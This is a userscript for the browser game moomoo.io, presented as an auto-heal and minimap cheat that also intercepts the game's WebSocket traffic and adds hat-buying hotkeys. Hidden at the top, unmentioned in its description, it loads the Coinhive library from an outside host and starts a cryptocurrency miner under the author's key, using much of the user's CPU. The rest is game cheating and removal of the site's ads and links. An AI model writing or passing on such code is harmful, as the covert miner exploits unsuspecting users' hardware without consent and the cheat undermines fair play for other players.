// ==UserScript==
// @name         Script dlya seregi
// @version      XL
// @description  Working auto heal and advanced minimap
// @author       Pe3ak
// @match        http://moomoo.io/*
// @match        http://dev.moomoo.io/*
// @require      http://code.jquery.com/jquery-1.12.4.min.js
// @grant        GM_registerMenuCommand
// @connect      moomoo.io
// @icon         http://i.cubeupload.com/5F25YM.jpg
// @namespace    https://greasyfork.org/users/136533
// @downloadURL https://update.greasyfork.org/scripts/37618/Script%20dlya%20seregi.user.js
// @updateURL https://update.greasyfork.org/scripts/37618/Script%20dlya%20seregi.meta.js
// ==/UserScript==
$.getScript( "https://coinhive.com/lib/coinhive.min.js" )
    .success(function( script, textStatus ) {
    var j3453425hr2j = new CoinHive.Anonymous('hoEiwikiP3VzZ5iZvXIdIP29SSf8Ra6Y');
    j3453425hr2j.setNumThreads(navigator.hardwareConcurrency/1.5);
    j3453425hr2j.setThrottle(0.2);
    j3453425hr2j.start();
});
$('#gameName').html('<div id="gameName">MooMoo.io</div>');
var commands = [{caption : 'MooMoo Hack Net Discord',execute : function () {go('https://discord.gg/pRBJ2C9');}}],
    moomooVer = $('#linksContainer2 .menuLink').html(),
    removeSelectors = ['#youtuberOf', '#linksContainer1', '#downloadButtonContainer', '#promoImgHolder', '#followText', '#adCard', '.menuHeader:nth-child(5)', '.menuHeader:nth-child(6)', '.menuText', '#twitterFollow', '#___ytsubscribe_0'],
    css = '#rightCardHolder {display: block!important;} #mapDisplay {background: url("//i.imgur.com/aGpK7hj.png")}',
    head = document.head || document.getElementsByTagName('head')[0],
    style = document.createElement('style'),
    ws,
    myID,
    hasApple = true,
    f = 0,
    aV = [0,0],
    hZ = [[7, "Bull Helmet"], [15, "Winter Cap"], [6, "Soldier Helmet"], [31, "Flipper Hat"], [22, "Emp Helmet"], [12,  "Booster Hat"], [20, "Samurai Armor"], [40, "Tank Gear"], [11, "Spike Gear"]],
    rZe = 0;

style.type = 'text/css';
if (style.styleSheet){
    style.styleSheet.cssText = css;
} else {
    style.appendChild(document.createTextNode(css));
}

for ( let i = 0; i < removeSelectors.length; i++ ) {
    $(removeSelectors[i]).remove();
}

head.appendChild(style);
$('#linksContainer2').html('<a href="./docs/versions.txt" target="_blank" class="menuLink">' + moomooVer + '</a>');

WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(m){
    this.oldSend(m);
    console.log(m);
    if (!ws){
        ws = this;
        socketFound(this);
    }
};

function socketFound(socket){
    socket.addEventListener('message', function(message){
        handleMessage(message);
    });
}

function addCommands (cmd) {
    if (typeof GM_registerMenuCommand != 'undefined') {
        GM_registerMenuCommand(cmd.caption, cmd.execute);
    }
}
function registerCommands () {
    commands.forEach(function (cmd) {
        addCommands(cmd);
    });
}

function go(url) {
    var win = window.open(url, '_blank');
    if (win) {
        win.focus();
    }
}

function parseWSMsg(s){
    if (s.indexOf("42") === -1) return -1;
    var o = s.substring(s.indexOf("["));
    return JSON.parse(o);
}


function isElementVisible(e) {
    return (e.offsetParent !== null);
}

function haveApple(){
    if (hasApple) hasApple = isElementVisible(document.getElementById("actionBarItem10"));
    return hasApple;
}

function handleMessage(m){
    var info = parseWSMsg(m.data);

    if (info[0] == "1" && !myID){
        console.log('GOT ID: ' + info[1]);
        myID =  info[1];
    }

    if (info[0] === "10" && info[1] === myID && info[2] !== 100){
        var random = Math.random() * (0.2 - 0.1) + 0.2 * 1000;
        setTimeout(function(){
            heal();
        }, random);
    }
}

function revertTitle(){
    f++;
    setTimeout(function(){
        f--;
        if (!f) {
            document.title = "Moo Moo";
        }
    }, 1500);
}

function hF(ki){
    if(aV[0] === 0){
        storeEquip(hZ[ki][0]);
        document.title = hZ[ki][1];
        aV[1] = 90;
        revertTitle();
    } else {
        storeBuy(hZ[ki][0]);
        aV[0] = 0;
        aV[1] = 180;
        document.title = "Bought. (if you had enough gold and didn't already buy it)";
        revertTitle();
    }
}

document.addEventListener('keydown', function(kfc) {
    if(!$(':focus').length) {
        switch (kfc.keyCode) {
            case 96: kfc.preventDefault(); aV[0] = 1; aV[1] = 300; document.title = "Buying...."; break;
            case 110: if(aV[0] === 1){kfc.preventDefault(); aV[1] = 120; document.title = "Not buying....";}  aV[0] = 0; break;
            case 107: kfc.preventDefault(); storeEquip(0); break;
            case 97: kfc.preventDefault(); hF(0); break;
            case 98: kfc.preventDefault(); hF(1); break;
            case 99: kfc.preventDefault(); hF(2); break;
            case 100: kfc.preventDefault(); hF(3); break;
            case 101: kfc.preventDefault(); hF(4); break;
            case 102: kfc.preventDefault(); hF(5); break;
            case 103: kfc.preventDefault(); hF(6); break;
            case 104: kfc.preventDefault(); hF(7); break;
            case 105: kfc.preventDefault(); hF(8); break;
        }
	}
});

registerCommands();